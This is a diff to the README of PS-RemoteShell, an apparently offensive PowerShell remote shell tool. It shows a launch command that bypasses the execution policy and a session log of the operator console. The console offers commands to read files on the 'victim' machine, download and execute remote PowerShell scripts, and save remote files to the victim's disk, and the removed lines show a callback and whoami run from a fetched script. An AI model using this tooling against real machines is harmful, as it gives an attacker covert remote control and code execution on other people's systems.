@@ -63,29 +63,27 @@ powershell -exec bypass Import-Module .\PS-RemoteShell.ps1; PS-RemoteShell -ip 1
 ```
 
 ```
-$ python PsShellClient.py 10.0.0.144 8080 test
-PS-RemoteShell Python Client v1.0
-Mr.Un1k0d3r RingZer0 Team
+(10.0.0.153:RINGZER0\mrun1k0d3r):Command >help
+
+Supported commands:
+------------------------------
+
+        read    [path]          Show the content of the specified file
+        remote  [url cmd]       Remotely download powershell script and execute a command
+        upload  [url path]      Download a remote file and save it to the victim disk
+        help                    Show this help
+        
+(10.0.0.153:RINGZER0\mrun1k0d3r):Command >read C:\windows\win.ini
+[*] ReadFile: Reading C:\windows\win.ini
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+...
+[*] ReadFile: execution Completed
 
 
-[*] Waiting for a connection...
-[+] Callback from 10.0.0.144:49758
-(192.168.70.133:RINGZER0\ME):Url >https://home.ringzer0team.com/ps.php
-(https://home.ringzer0team.com/ps.php):Exec >Get-BrowserHomepage
 
-Start Page
-----------
-http://go.microsoft.com/fwlink/p/?LinkId=255141
-
-
-
-(192.168.70.133:RINGZER0\ME):Url >null
-(null):Exec >whoami
-RINGZER0\ME
-
-(192.168.70.133:RINGZER0\ME):Url >
-
-The ps.php file located at https://home.ringzer0team.com/ps.php is encrypted using the following key: test
 ```
 
 # Credit 
